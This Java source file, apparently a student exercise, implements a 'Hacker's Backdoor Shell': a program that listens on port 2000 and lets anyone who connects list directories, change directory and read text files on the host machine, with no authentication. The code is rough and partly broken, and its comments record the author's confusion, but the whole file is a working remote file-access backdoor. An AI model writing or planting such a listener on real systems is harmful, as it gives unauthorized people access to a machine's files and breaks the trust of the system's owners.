package com.tyner.csudh.backdoor;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.*;
import java.util.stream.Stream;


public class Backdoor_Shell {
	public static void main(String[] args) throws FileNotFoundException {
		
		//HOW DO I GET FOLDERS INTO THIS ECLIPSE FILE?
	
		
		//Scanner input = new Scanner(System.in);
		
		
		
		//String file = "C:\\These_Files\\";
		
		
		
		//File Direct = new File(file);
		
		try {
			ServerSocket server=new ServerSocket(2000);
			Socket client=server.accept();
			String workingDir=System.getProperty("user.dir");
			String toBeginning = System.getProperty("user.dir");
			String folder = workingDir + File.separator + "folder";
			String prompt=System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
			System.out.println();
			
			//File workDirectory=System.getProperty(null)
			
			InputStream in=client.getInputStream();
			OutputStream out=client.getOutputStream();
			
			BufferedReader reader=new BufferedReader(new InputStreamReader(in));
			BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(out));
		
			writer.write("\nWelcome to Hacker's Backdoor Shell\n\n");
			
		//	File [] File = Direct.listFiles();
			
			File wrkDir = new File(workingDir);
			
			File toBeg = new File(toBeginning);
			
			while(true) {
				
				
				
				writer.write(workingDir+prompt);
				writer.flush();
				String clientCommand=reader.readLine();
			
				
				
				
				if(clientCommand.equalsIgnoreCase("pwd")) {
					writer.write("\r\nWorking directory is: "+workingDir+"\n\n");
				}
				else if(clientCommand.equalsIgnoreCase("dir")){
					
					
					
					
					//File object with workingDir
					//file.listFiles()
					
					File [] file = wrkDir.listFiles();
					
					
					int am = file.length;
					
					for(File f:file)
					{
						
						String isOrNot = null;
						
						long amount = f.length();
						
						if(f.isFile())
						{
							isOrNot = "File";
						}
						else if (f.isDirectory())
						{
							isOrNot = "Directory";
						}
						
						writer.write(f.getName()+" "+ isOrNot );
						writer.write("\n");
	
						
						//THIS JUST LIST THE NAMES OF THE FILES INSIDE OF THE ECLIPSE
						
					}
					writer.write(am + " amount of content in this folder");
						
					
					
					
				}
				else if(clientCommand.equalsIgnoreCase("cd")) //PRINTS THE PROMPTS AFTER YOU ALREADY TYPED IT IN
				{
					writer.write("Enter the name of the directory you wish to look at\n");
					String directoryName =reader.readLine();
					
					File direct = new File ("C:\\"+directoryName+"\\");
					
					if(direct.isDirectory())
					{
						writer.write("Enter '.' to stay in the directory you typed\nEnter '..' to go to your previous directory\nEnter '~' to go back to your original directory\n");
						String cdChoice = reader.readLine();
						
						
						
						
							if(cdChoice.equalsIgnoreCase("."))
							{
								wrkDir = direct;
								
								workingDir = directoryName;
						
							}
							else if (cdChoice.equalsIgnoreCase(".."))
							{
						
					
								File prev = new File(direct.getParent());
								
								wrkDir = prev;
								
								workingDir = (direct.getParent());
								
							}
							else if(cdChoice.equalsIgnoreCase("~"))
							{
								
								wrkDir = toBeg;
								
								workingDir = toBeginning;
								
							}
					}
					else if(!direct.isDirectory())
					{
						writer.write(directoryName + " not found!");
					}
					
					
				}
					
					

				else if(clientCommand.equalsIgnoreCase("cat"))//PRINTS THE PROMPTS AFTER YOU ALREADY TYPED IT IN
				{
					writer.write("Enter the name of the file you wish to read");
					
					String fileName = reader.readLine();
			
					File fil = new File("C:\\"+workingDir+"\\"+fileName+".txt");
					
					reader = new BufferedReader(new FileReader(fil));
					
					if(fil.isFile())
					{
						while(reader.ready())
					{
						String data = reader.readLine();
						writer.write(data);
					}
					}
					else if(!fil.isFile())
					{
						writer.write("File not found!\n"); //DOSENT PRINT WHEN FIL IS NOT A FILE
					}
					
					
					
					//CLOSES CONNECTION AFTER USING CAT
					
					
				}
				else if(clientCommand.equalsIgnoreCase("]"))
				{
					System.exit(0);
				}
				
				
			}
			
			

		}
		catch(IOException e) {
			e.printStackTrace();
		}
		
		
		
	}
	
	
	

}
